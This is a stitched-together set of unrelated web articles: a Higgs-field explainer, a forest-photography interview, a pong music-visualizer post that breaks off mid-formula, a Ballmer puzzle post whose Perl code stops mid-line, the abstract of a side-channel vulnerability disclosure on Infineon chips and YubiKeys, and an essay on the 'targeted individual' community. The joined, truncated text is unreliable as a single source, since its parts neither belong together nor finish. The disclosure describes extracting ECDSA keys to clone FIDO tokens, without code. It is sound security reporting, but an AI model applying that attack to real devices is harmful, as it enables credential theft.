<blockquote><p><em>There’s this substance, like a soup, that fills the universe; that’s the Higgs field. As particles move through it, the soup slows them down, and that’s how particles get mass.&nbsp; </em></p></blockquote>
<p>Other versions portray the Higgs field as akin to molasses, a thicket, a crowd of people or an expanse of snow.</p>
<p>However, all such stories conflict with what we physicists teach in the very first weeks of first-year university courses. By suggesting that the Higgs field creates mass by exerting drag, they violate both Newton’s first and second laws of motion. Among other disasters, this drag would long ago have caused the Earth to spiral into the Sun. Moreover, if the Higgs field were really a substance, it would provide a point of comparison against which we could measure our absolute motion, violating both Galileo’s and Einstein’s principles of relativity.</p>
<p>In truth, the Higgs field has nothing to do with motion or slowing. Instead, its story is all about vibration.</p>
<p>Quantum field theory, the powerful framework of modern particle physics, says the universe is filled with fields. Examples include the electromagnetic field, the gravitational field and the Higgs field itself. For each field, there’s a corresponding type of particle, best understood as a little ripple in that field. The electromagnetic field’s ripples are light waves, and its gentlest ripples are the particles of light, which we call photons. Similarly, electrons are ripples in the electron field, and the Higgs boson is a minimal ripple in the Higgs field.</p>

<p>A stationary electron, much like the vibration of a guitar string, is a standing wave that vibrates with a preferred frequency, known as its resonant frequency. Such resonant vibration is common and familiar. Because a plucked guitar string consistently rings at its resonant frequency, it always makes the same tone. Likewise, the fixed frequency of a swinging pendulum is what makes it an effective clock. On the same principle, every stationary electron vibrates with the resonant frequency of the electron field.</p>
<p>Most of the universe’s fields have resonant frequencies. In a sense, the cosmos loosely resembles a musical instrument; both have characteristic frequencies at which they most readily vibrate.</p>
<p>For me personally, the fact that resonance lies at the foundation of reality is a source of delight and amazement. As a lifelong amateur musician and composer, I’ve long understood the inner workings of pianos, clarinets and guitars. But I was completely astonished to learn, back when I was a graduate student, that the structures of the universe, even within my own body, operate on similar principles.</p>
<p>Yet this secret musicality of our cosmos would be impossible were it not for the Higgs field.</p>
<p>In quantum field theory, a combination of quantum physics and Einstein’s relativity leads to a crucial relationship between a resonant frequency and the mass of an elementary particle: The more rapidly a stationary particle vibrates, the greater its mass. Fields lacking a resonant frequency correspond to particles that have no mass; such particles, including the photons of the electromagnetic field, can never be stationary.</p>
<p>While the Higgs tall tales suggest that mass arises from the slowing of elementary particles by a molasses-like substance, the truth is that a stronger Higgs field makes the elementary particles vibrate at higher frequencies, thus raising their masses. One might therefore view the Higgs field as a sort of cosmic stiffening agent, whose role is to increase the resonant frequencies of other fields.</p>
<p>How is it possible for one field to change the frequency of another? The humble pendulum gives us a simple example.</p>
<p>Imagine placing a ball at the end of a string out in deep space, where the gravitational field is essentially zero. The ball will float aimlessly. If you give it a little push, its position may slowly drift, but it won’t vibrate.</p>
<p>However, if you put the makeshift pendulum in a nonzero gravitational field, everything changes. The ball hangs straight down and, if disturbed, will swing.</p>
<figure>
    <p><img src="https://www.quantamagazine.org/wp-content/uploads/2024/08/Higgs_Explainer-crMarkBelan-Desktop-v1-01.svg" alt="" decoding="async" loading="lazy"><img src="https://www.quantamagazine.org/wp-content/uploads/2024/08/Higgs_Explainer-crMarkBelan-Mobile-v1-02.svg" alt="" decoding="async" loading="lazy">    </p>

            <p>Mark Belan for&nbsp;<em>Quanta Magazine</em></p>
        </figcaption>
    </figure>

<p>When stationary, the ball is said to be in equilibrium — stable, balanced and with no reason to move. If the ball is displaced to the right, gravity will cause it to swing back to the left, and vice versa. The tendency of the ball’s position to return to the point of equilibrium, known as a restoring effect, is what causes it to swing.</p>
<p>Here the gravitational field acts as a stiffening agent: It stiffens the pendulum, thereby giving it a nonzero resonant frequency. The stronger the gravitational field, the more powerful the restoring effect and the higher the pendulum’s resonant frequency.</p>
<p>Analogously, the Higgs field creates a restoring effect on other elementary fields that changes the way they vibrate. Although any field can have traveling ripples like those that cross a pond, a restoring effect allows a field to have stationary ripples, the standing waves that resemble those on a guitar string. As I mentioned earlier, these standing waves are nothing more nor less than motionless elementary particles, rippling in their respective fields.</p>
        
        
<p>This notion lies at the heart of what the late British physicist Peter Higgs, namesake of the Higgs field, and his competitors pointed out in the 1960s: that one field can stiffen other fields, thereby permitting their ripples to vibrate in place with a resonant frequency, and thus giving their particles mass. Experimental studies of the Higgs boson at the Large Hadron Collider confirm that this is indeed what the Higgs field does. By using the mathematics of the <a href="https://www.quantamagazine.org/a-new-map-of-the-standard-model-of-particle-physics-20201022/">Standard Model of particle physics</a> — the quantum field theory describing all the known elementary particles and the interactions among the universe’s fields — scientists make predictions for the Higgs boson’s behavior that precisely match experiments. There is no doubt: The Higgs field creates a restoring effect on many other fields.</p>
<p>So with this deeper understanding of the Higgs field, let me suggest a different tale:<em>&nbsp;</em></p>
<blockquote><p><em>Once upon a time, there came into being a universe. Searingly hot, it swarmed with elementary particles. Among its fields was a Higgs field, initially switched off. But as the universe expanded and cooled, the Higgs field suddenly switched on, developing a nonzero strength. When this happened, many fields became stiff, and as a result their particles acquired resonant frequencies and mass. That’s how the universe was transformed, through the influence of the Higgs field, into the quantum musical instrument it is today.</em></p></blockquote>

   <p>“As humans, our everyday lives are sustained by the behaviors and interactions of forest organisms,” photographer David Herasimtschuk writes of old growth forests. “Yet, because these processes and relationships occur in places and at scales rarely observed, our connection with forest biodiversity and the role it plays in nurturing our well-being often goes completely unnoticed.”</p>   <p>In the last 10 years, Herasimtschuk has photographed forests across the Pacific Northwest, documenting the inhabitants of these last remaining old-growth ecosystems. From salamanders and salmon to bears and mountain lions, his images illustrate not only the beauty of the forests and their creatures but the symbiotic relationships which are vital to the forests’ health and the planet’s welfare.</p>   
   <p>We interviewed Herasimtschuk about his efforts to educate people about the importance of preserving these ancient forests. The interview has been edited for clarity and length.</p>   <div id="resg-s1-5092">

   <p><strong>What motivates you to photograph old-growth forests?</strong></p>   <p>Protecting intact, mature and old-growth forests worldwide has been found to be one of the most immediate and cost-effective solutions to mitigating the impacts of climate change, yet adequate policy to manage these forests for ecosystem health and carbon storage has been limited.</p>   <p>The temperate rainforests of western North America have the highest carbon storage potential of any forest type in the world and are recognized as some of the most valuable ecosystems on the planet. Yet, conflicts over these forests have been ongoing since the 1980s, with the timber industry and conservation community battling over how they are managed.</p>   <p>Celebrating the beauty and importance of these environments, this photo essay is a present-day look at the complex connections we share with these forests. Currently, there are numerous proposed policy initiatives that are focused on creating a new framework for forest health and old-growth protection in the Pacific Northwest. This includes a movement to protect mature forests, which are made up of trees that are 80-150 years old and viewed as comprising the next generations of old-growth forests.</p>   <div id="resg-s1-5093">

   <p>These legislative actions also contain policy to update and rethink how private and state forests are managed in the state of Oregon, as well as work to modernize forest protection on federal lands nationwide. In an effort to advance our country’s climate initiatives, the Biden administration enacted an executive order in 2022 that committed the federal government to protecting the few remaining mature and old-growth forests we have left. In response to that order, the U.S. Forest Service plans to make major revisions to both the National Forest Plan and Northwest Forest Plan this year.</p>   
   <p>With many decisions currently being discussed about the fate of our forests in the Pacific Northwest, it's important that the public and decision-makers understand how healthy forests function, and have the information they need to make science-based decisions in regard to forest management.</p>   <div id="resg-s1-5095">

   <p><strong>How long have you been working on this project?</strong></p>   <p>I have been working, living and exploring in the Pacific Northwest since 2011, and started this old-growth focused project in 2022.</p>   <p><strong>What kinds of images were you hoping to capture with your work?</strong></p>   <p>From the top of the canopy to the waters below, my goal for this project is to create a series of photos that provide an entire ecosystem aesthetic. To do this, I work to create wide-angle images that put a species, or human, in context of the forest or habitat type.</p>   <p>Currently, a large amount of my work focuses on the connections between forests, rivers and fish. In the Pacific Northwest, the relationship between salmon and forests embodies a sense of connection that seems almost mystical. Delivering a pulse of nutrients, returning adult salmon nourish some of the largest trees in the world, and in return, these ancient forests provide a foundation for the complexity of conditions that salmon and other fish rely on. For millions of years, salmon, trout and numerous other aquatic species have adapted to the conditions created by these massive trees. From bank stabilization and water filtration to the creation of cover and spawning habitat, large trees provide a multitude of ecosystem services for aquatic environments.</p>   <div id="resg-s1-5097">

                In the Pacific Northwest, it’s becoming increasingly difficult to experience large salmon runs that are similar to what was seen historically. The forests of the Pacific Northwest have some of the highest carbon storage potential of any forest type in the world. With certain tree species' ability to grow up to three times faster when supported by the nutrients salmon bring to a forest's ecosystem, it's believed that salmon restoration could be an important tool to help increase a forest’s ability to sequester carbon in the region.

   <p><strong>What have you learned about the forest’s ecosystem since you’ve started this project?</strong></p>   <p>One of the most important concepts I’ve come to understand while working on this project is that not all forests are equal. How we manage a forest can have huge repercussions that impact numerous species and processes, and can often lead to changes in ecosystem services that humans rely on.</p>   
   <p>Historically, the idea of old-growth forests as important natural systems was not the dominant perspective in our society. These ancient trees were once considered crops and perceived as “biological deserts.” Industrial logging in the 20th century removed most of the old growth, resulting in the younger forests we experience today. While some areas on federal land have been protected, allowing forests to regrow, there have also been large tracts of private land that are now managed for timber, and are cut every 50-80 years to meet the demand for timber.</p>   <div id="resg-s1-5098">

   <p>Over the last 50 years, science has been working to understand how these impacts have changed forest ecosystems in the region. Beyond carbon sequestration, scientists are finding these environments play an important role in a multitude of ecosystem services, including water quantity and quality, and that management decisions can greatly impact these processes.</p>   <p><strong>What have you learned that’s surprised you?&nbsp;</strong></p>   <p>Looking beyond their physical beauty, scientists are discovering that old-growth forests are home to a network of almost unfathomable connections that showcase the importance and complexity of regions biodiversity. One of the greatest examples is the relationship between salmon and trees. Salmon are fundamental to the health of forest ecosystems in the Pacific Northwest. As they return home to spawn and die, they bring with them a large pulse of nutrients that helps drive stream and forest ecosystems. By absorbing the nutrients from decaying fish, researchers have found that salmon actually provide nitrogen to trees, which is a limited nutrient in forest ecosystems. It’s even been discovered that certain tree species can grow up to three times faster when influenced by salmon. As populations of these vital fish continue to decline throughout the Pacific Northwest, scientists worry that trees and forests no longer receive nutrients they need to reach their full ecological potential.</p>   <div id="resg-s1-5099">

   <p>Beyond the salmon and trees, some of the largest surprises in these forests come from some of the smallest species, like salamanders. Due to the cryptic nature of these amphibians, it's hard to grasp their true importance within an ecosystem, but recent research has demonstrated that these amphibians play an important role in the global carbon cycle.</p>   
   <p>In Northern California, scientists have revealed that, by hunting and preying on insects that spend their lives ripping, shredding and feeding on leaves — a behavior that actually releases carbon dioxide into the atmosphere — salamanders effectively prevent this carbon from entering the atmosphere and allow it to stay locked in leaves and on the forest floor.</p>   <div id="resg-s1-5129">

   <p><strong>What is your process for documenting the wildlife in the forest? Do you need special equipment?</strong></p>   <p>Working and photographing in old-growth forests definitely comes with a unique set of challenges, and through trial and error, I’ve been able to develop methods that work relatively well in these environments. Documenting these forests from an ecosystem perspective often means I need a wide range of gear. This includes everything from underwater housings and drysuits to document fish, to camera traps to photograph large mammals like bears.</p>   <p>For me, personally, I also really enjoy the process and exploration that goes into the creation of each photograph. For each image, this often results in many miles hiked, and snorkeled, to learn the best locations and approaches to photograph different species. Most days aren’t a great success, photographically speaking, but I love being in the forest, and with each outing, I feel like I learn a little more.</p>   <div id="resg-s1-5128">

   <p><strong>Do you work with scientists studying forest ecosystems? If so, how does that collaboration work?</strong></p>   <p>Working at the confluence of science, conservation and storytelling, I’ve been fortunate to collaborate with many passionate scientists working at the forefront of forest ecology. Much of the imagery created for this project has been guided and inspired by the research and science from H.J. Andrews Experimental Forest, a forest co-managed by the U.S. Forest Service and Oregon State University. Tucked in the Cascade Mountain Range in western Oregon, this long-term ecological research site is one of the most studied old-growth ecosystems on the planet and has laid the foundation for forest science, understanding and policy worldwide.</p>   
   <p>As we move forward in our approach to address climate change, finding engaging and novel ways to communicate science becomes more important than ever. Working closely with the researchers who are uncovering the importance and mysteries of our natural world, this project focuses on creating imagery that sparks curiosity and helps celebrate the interactions and relationships in nature that are difficult to see.</p>   <div id="resg-s1-5127">

   <p><strong>What are some of your favorite images?</strong></p>   <p>I think some of my favorite images so far for this project have been the ones created using camera traps. Communicating the size of old-growth trees is often difficult, so it’s helpful to have a subject in the image to convey scale. Few species symbolize wild environments better than mountain lions and bears, so to be able to create images of these elusive predators as they explore their old-growth habitats is truly special.</p>   <div id="resg-s1-5126">

   <p>Creating a useful image with a camera trap can often take months of work and fine-tuning, and even then, it’s rare to get the shot you hoped for. The cameras sit in the forests for long periods of time, exposed to the elements and curious wildlife. It’s not uncommon to return to a trap to find it has been dismantled by a bear or knocked over from falling trees and branches.</p>   <p>Yet, with a little luck and a lot of persistence, every now and then you create a photo where all the elements come together. These unique photos provide an intimate perspective of these environments that few have ever seen, making them a valuable tool to help teach audiences about the importance of these forests.</p>   <p><strong>What do you want people to come away with after looking at these images?</strong></p>   <p>As the climate and planet continue to change, many people are trying to understand and grasp how the natural world is connected to their everyday lives. So often, the question is asked, what is the value of an individual species? Or what is the value of biodiversity? By creating storytelling imagery that helps audiences recognize the relevance of forest life, my hope is that this project will engage and inform audiences about the importance of old-growth ecosystems in the Pacific Northwest. Bringing to attention the individual species and relationships within ecosystems that play a role in maintaining our planet, my goal is to spark curiosity and wonder, encouraging people to want to learn more.</p>   
   <p>As our demand and impact on forests continues to grow worldwide, I believe images and stories of the environments and species affected will play a critical role in visually connecting forest ecosystems to their would-be stewards. Understanding the importance of biodiversity and how forests function is a critical part in creating that connection.</p>   <div id="resg-s1-5130">

<div id="readability-page-1" class="page"><div dir="auto"><div id="youtube2-lxjElOAgkPg" data-attrs="{&quot;videoId&quot;:&quot;lxjElOAgkPg&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}" data-component-name="Youtube2ToDOM"><p><iframe src="https://www.youtube-nocookie.com/embed/lxjElOAgkPg?rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0" frameborder="0" loading="lazy" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true" width="728" height="409"></iframe></p></div><p>Lately I’ve been experimenting with music visualizers. One of my favorites is inspired by the classic arcade game pong. In classic pong a ball bounces off of paddles in a steady rhythm. What if we synchronize the bounces to the beat of a song, making the paddles dance?</p><p>To make this possible we alter the physics of the game so that the ball moves at a constant speed, and paddles can move anywhere on their respective halves of the screen.</p><p>We also retain these rules from the classic game:</p><ul><li><p>The contact point of the ball on the paddle determines its angle of reflection</p></li><li><p>Paddles have no speed limit</p></li><li><p>The ball bounces off the top and bottom of the screen</p></li></ul><p>These physics give us the necessary degrees of freedom to move the paddles to hit the ball at any desired times. </p><p>One simple strategy to satisfy any timing requirements is to keep both paddles close to the center. This gives us little horizontal space, but vertical space is effectively infinite since the ball can bounce off the top and bottom edges of the screen. For any desired shot duration, we can slow the horizontal velocity to match it by hitting the ball more vertically. While this argument shows a solution exists for any input, it certainly isn't exciting to watch.</p><p>What makes a visualization appealing, though? One desirable property is the utilization of screen space; a game stuck in a small region feels cramped and underwhelming. Closely related is dynamism of movement; spectators enjoy watching players make heroic efforts to hit a ball just within reach.</p><p>Unfortunately it's difficult to write an algorithm to maximize screen usage while guaranteeing a valid game. If a paddle hits the ball far from the screen's center, the ball may not have time to cross the screen for the next beat. Any movement of the paddles must account for the potential impact on future moves. This is the crux of the problem: while respecting the beat of the song and the physics of the game, where should the paddles hit the ball on each beat to maximize screen utilization?</p><p>Fortunately there is a mature field dedicated to optimizing an objective (screen utilization) with respect to variables (the locations of bounces) in the presence of constraints on those variables (physics and the beats of the song). If we write our requirements as a constrained optimization problem, we can use an off-the-shelf solver to compute optimal paddle positions instead of designing an algorithm ourselves.</p><p>Formulating the task as a constrained optimization problem has several advantages. If we change the physics we simply need to update our constraints, while an algorithm may need to be rewritten. In a similar vein, it lets us easily experiment with objectives. Developing appealing animations is an iterative process, which the declarative style of constrained optimization facilitates.</p><p>That sounds great, but modeling 2D constraints is hard; is our game truly two-dimensional? It turns out modeling only the horizontal component is sufficient! In our ruleset, the ball moves at a constant speed, so its vertical velocity is exactly determined by its horizontal velocity. By simulating the game we can compute the ball's vertical position at any time.</p><p>Knowing the ball's vertical position also gives us the vertical position of the paddles since it must match the ball's position to hit it (plus a small delta to achieve the desired angle). Between hits, we simply linearly interpolate positions to achieve smooth movement. Thus we only need our solver to compute the horizontal positions and velocities at the times when the paddles hit the ball; the rest follows from the physics of the game.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png" data-component-name="Image2ToDOM" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png" width="616" height="400" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:400,&quot;width&quot;:616,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:13931,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Diagram of shot i</figcaption></figure></div><p>Let's start by defining the hardcoded parameters of the game:</p><div data-component-name="Latex"><p><span>\(\begin{align}

<p>In this short video <a href="https://en.wikipedia.org/wiki/Steve_Ballmer">Steve Ballmer</a> talks about a puzzle question he would ask candidates interviewing at Microsoft. Solving it is based on <a href="https://en.wikipedia.org/wiki/Binary_search">binary search</a> and the <a href="https://en.wikipedia.org/wiki/Expected_value">expected value</a>.</p><p><iframe allowfullscreen="" height="266" src="https://www.youtube.com/embed/svCYbkS0Sjk" width="320" youtube-src-id="svCYbkS0Sjk"></iframe></p><p>Here's what he says: "<i>I'm thinking of a number between 1 and 100. You can guess, after each guess I'll tell you whether high or low. You get it the first guess I'll give you five bucks. Four bucks, three, two, one, zero, you pay me a buck, you pay me two, you pay me three</i>".&nbsp;</p><p>The question is "<i>Should you accept to play this game?</i>". In the interview, Ballmer states that the answer is "No" for two reasons: firstly, because he can pick numbers that'll be the most difficult for you to determine, secondly because the expected value of the game (assuming Ballmer chooses randomly) is negative: you end up paying Ballmer.</p><p>He's right on the first count. If you follow a binary search strategy (which will be optimal if he's choosing randomly) and he chooses one of&nbsp;2, 5, 8, 11, 14, 17, 20, 22, 24, 27, 30, 33, 36, 39, 42, 45, 47, 49, 52, 55, 58, 61, 64, 67, 70, 72, 74, 77, 80, 83, 85, 87, 90, 93, 96, 98 or 100 then you owe him $1. For all other numbers you get $0 (if he chose&nbsp;1, 4, 7, 10, 13, 16, 19, 23, 26, 29, 32, 35, 38, 41, 44, 48, 51, 54, 57, 60, 63, 66, 69, 73, 76, 79, 82, 86, 89, 92, 95 or 99) or a positive outcome (some of his money!).</p><p>In the video above Ballmer chooses 59 which a binary search strategy would have found in 5 steps resulting in the interviewer, Emily Chang, winning $1. She was actually pretty close to doing that. The binary search steps would be 50, 75,&nbsp;62, 56, 59 and she guessed 50, 75, 60, 55, 57, 58, 59.&nbsp;</p><p>On the second count (Baller implies the expected value is negative), if he's choosing randomly, then he's wrong. The expected value is $0.20 (calculated discretely using the code below). The code calculates the number of guesses for each value and an overall expected value assuming Ballmer chooses randomly.</p><p><span>use strict;<br></span><span>use warnings;<br></span><span><br>my @v = (0, 5, 4, 3, 2, 1, 0, -1, -2);<br></span><span><br>my $ev = 0;<br></span><span>my $ec = 0;<br></span><span><br>my @range = (1..100);<br></span><span><br>foreach my $r (@range) {<br></span><span>&nbsp; &nbsp; my $l = $range[0];<br></span><span>&nbsp; &nbsp; my $h = $range[$#range];<br></span><span><br>&nbsp; &nbsp; my $s = 0;<br></span><span>&nbsp; &nbsp; while (1) {<br></span><span>&nbsp; &nbsp; &nbsp; &nbsp; $s += 1;<br></span><span>&nbsp; &nbsp; &nbsp; &nbsp; my $g = int(($l + $h)/2);<br></span><span><br>&nbsp; &nbsp; &nbsp; &nbsp; if ($r == $g) {<br></span><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print "$r found in $s steps (" . dollar($v[$s]) .

<h3>Abstract</h3>
<p><span> 
Secure elements are small microcontrollers whose main purpose is to generate/store secrets and then execute cryptographic operations. They undergo the highest level of security evaluations that exists (Common Criteria) and are often considered inviolable, even in the worst-case attack scenarios. Hence, complex secure systems build their security upon them.</span></p>

<p><span>
FIDO hardware tokens are strong authentication factors to sign in to applications (any web service supporting FIDO); they often embed a secure element and the FIDO protocol uses Elliptic Curve Digital Signature Algorithm (ECDSA for short) as its core cryptographic primitive. <tt>YubiKey 5 Series</tt> are certainly the most widespread FIDO hardware tokens, their secure element is an Infineon <tt>SLE78</tt>.</span></p>

<p><span>
This document shows how – finding a JavaCard open platform (the <tt>Feitian A22</tt>) based on a similar Infineon <tt>SLE78</tt> – we understood the Infineon ECDSA implementation, found a side-channel vulnerability and designed a practical side-channel attack. The attack is then demonstrated on a <tt>YubiKey 5Ci</tt>. Finally, we show that the vulnerability extends to the more recent Infineon <tt>Optiga Trust M</tt> and Infineon <tt>Optiga TPM</tt> security microcontrollers.</span></p>

<p><span>
Our work unearths a side-channel vulnerability in the cryptographic library of Infineon Technologies, one of the biggest secure element manufacturers. This vulnerability – that went unnoticed for 14 years and about 80 highest-level Common Criteria certification evaluations – is due to a non constant-time modular inversion.</span></p>

<p><span>
<b>The attack requires physical access to the secure element</b> (few local electromagnetic side-channel acquisitions, i.e. few minutes, are enough) <b>in order to extract the ECDSA secret key.</b> In the case of the FIDO protocol, this allows to create a clone of the FIDO device.</span></p>

<p><span>
<b>All <tt>YubiKey 5 Series</tt> (with firmware version below 5.7) are impacted by the attack and in fact all Infineon security microcontrollers (including TPMs) that run the Infineon cryptographic library (as far as we know, any existing version) are vulnerable to the attack.</b> These security microcontrollers are present in a vast variety of secure systems – often relying on ECDSA – like electronic passports and crypto-currency hardware wallets but also smart cars or homes. However, we did not check (yet) that the EUCLEAK attack applies to any of these products.</span></p>

<h3>Cautionary Note</h3>
<p><span> 
Authentication tokens (like FIDO hardware devices) primary goal is
 to fight the scourge of phishing attacks. The EUCLEAK attack requires physical access to
the device, expensive equipment, custom software and technical skills.<b> Thus, as far as the work presented here goes, it is still safer to use your YubiKey or other impacted products as FIDO hardware authentication token to sign in to applications rather than not using one.</b></span></p>

<h3>Discovered By</h3>
<p><span> Thomas Roche (NinjaLab)</span></p>

<h3>List of Impacted Products</h3>
<ul>
<li> All Infineon security microcontrollers embedding Infineon cryptographic library (any existing version). For instance, all existing versions of Infineon TPMs are affected. </li><br>
<li> All <tt>YubiKey 5 Series</tt> (with firmware version below 5.7) </li>
</ul>


<h3>Further Notes</h3>
<p><span>
1. The impacted Feitian A22 Javacard used in this work is an old product no more available for sale. All Feitian products currently available on their webstore (and based on an Infineon security microcontroller) use Feitian own cryptographic library, and are not impacted by our work to our knowledge.
</span></p>
<p><span>
2. The new YubiKey firmware 5.7 update (May 6th, 2024) switches the YubiKeys from Infineon cryptographic library to Yubico new cryptographic library. To our knowledge, this new cryptographic library is not impacted by our work.
</span></p>
<p><span>
3. Infineon has already a patch for their cryptographic library, to our knowledge it did not yet pass a Common Criteria certification evaluation.
</span></p>

<h3>CVE</h3>
<p><span> 
We are still waiting for a CVE ID.

<div id="readability-page-1" class="page"><div><p>In November 2020, the voices came. Luca didn’t know how many there were or how they managed to force themselves into his mind.</p>
<p>‘He’s only 20.’</p>
<p>‘We owe you money.’</p>
<p>‘[Pretending to be police] Another mind rape!’</p>
<p>‘You’re in hell.’</p>
<p>‘It’s a safe world.’</p>
<p>‘My little boy…’</p>
<p>Luca was 20. He was a musician living in London. He had taken some college courses but had to drop out to move out of his mother’s home. And now he appeared to be the target of a malicious experiment.</p>
<p>Over the months, he learned to distinguish the voices. There was a whole group of them, which he called ‘The Team’. The Team knew everything about him. They knew the names of his friends and family members. They knew about his musical aspirations. Sometimes they could be extremely cruel. They joked about the years of abuse he suffered under his mother – whom they named ‘Innocent’. They pretended to be his father, whom he scarcely knew. Yet they could show compassion. They celebrated his music. They promised to reveal their technologies to him. They said they would make him famous.</p>
<p>Eventually, the police brought Luca to a hospital against his will. A psychiatrist asked how long he had heard voices. Luca protested that he did not hear <em>voices</em>; he heard <em>people</em>. His doctors told him he was having hallucinations and delusions. They said these were symptoms of a disorder they could treat, or at least manage, with drugs.</p>
<p>Luca agreed to take the drugs, not because he thought he was mad, but because he hoped they would disrupt the signal between his brain and The Team. But the drugs made things worse. They made The Team angry – so they tortured him more. He thought constantly about suicide. Sometimes the voices were so overwhelming he had to lie down wherever he was. One day he found himself on the floor of a grocery store. He typed ‘mind rape’ into his phone. That’s when he discovered the targeted individual community.</p>
<p><span>B</span>efore about 2000, people with experiences like Luca’s had few options. They could turn to a psychiatrist, or spiral further into isolation, fear and paranoia. But the advent of the personal computer and the availability of the internet changed that. People like Luca were now communicating with each other, finding parallels between their experiences, and trying to track down who was doing this to them.</p>
<p>Hence was born the targeted individual (TI) community: a group of people who openly shared their experiences of high-tech harassment and organised stalking.</p>
<p>Among the first to come forth was a Canadian engineer, Eleanor White, who created a website called Multistalkervictims. A US Navy veteran, Derrick Robinson, started a non-profit, People Against Covert Torture and Surveillance, International (PACTS). A former analyst for the US National Security Agency, Karen Stewart, <a href="https://www.youtube.com/watch?v=AqHtr1Fy1a0" target="_blank" rel="noreferrer noopener">went public</a> with her experiences of organised stalking.</p>
<p>Some TIs have sought refuge abroad. Many have the belief they’ve been microchipped</p>
<p>By the 2010s, a flood of people were sharing similar experiences. An Oxford-trained physicist, Katherine Horton, started a website on counter-technology called Stop007. A life coach in California, Cathy Meadows, wrote the book <em>Hey Mom, I’m a Targeted Individual</em> (2018) offering psychological support to TIs and their families. A physician from San Antonio in Texas, John Hall, speculated about the underlying technology in his book <em>Guinea Pigs</em> (2014). An ordained minister, the Rev Dr Millicent Black, started the online church Refuge from the Storm for other TIs, which sees the fulfilment of biblical prophecy in the harassment of TIs. Today the TI community is a loosely organised global network with regional and local support groups. In 2016, <em>The</em> <em>New York Times</em> estimated there were at least 10,000 people who identify <span>as TIs.</span></p>
<p>TIs have a diverse range of experiences. Some involve electronic harassment. Voices projected into the mind. Crackling or popping sounds in the ears. Burning or pricking sensations on the skin. Migraines. Sleeplessness. Others centre around gang-stalking. Being followed in the streets. Several people wearing the same-coloured shirt, or driving the same-coloured car, as a coded threat. Strangers in public commenting on the TI’s private life. People breaking into their homes and damaging things. Some TIs have sought refuge abroad. Many have the belief they’ve been microchipped. Some implore surgeons to remove the implanted devices.</p>
<p>Researchers have collated a range of <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7178134/" target="_blank" rel="noreferrer noopener">theories</a> about why TIs believe these evils are happening to them. Some think it’s payback from an ex-spouse, or retaliation for being a whistleblower at work. Others think they were just unlucky to be chosen for the experiment. Many share the belief that their tormenters want others to ‘think they’re crazy’ to discredit them. Cathy Meadows urges TIs not to share their experiences too openly as ‘it serves [the stalkers’] ultimate purpose of making the target look crazy’. Instead, she offers TIs practical advice: find love, look great, don’t act paranoid.</p>
<p>Shortly after that moment on the floor of a grocery store, Luca met with more experienced TIs. An older man gave Luca two pieces of advice: keep going, and don’t kill yourself.</p>
<p><span>J</span>ournalists often depict the TI community as a postmodern tragedy – a byproduct of unregulated social media. Here are thousands of very sick people, we’re told, who are just reinforcing each other’s delusions and making each other sicker because they refuse to see psychiatrists. These reports dismiss TIs as promoting one more dangerous conspiracy theory (though I doubt that TIs will ever become a major driver of conspiracy theories, partly because they have unusual experiences that run-of-the-mill conspiracy theorists lack).</p>
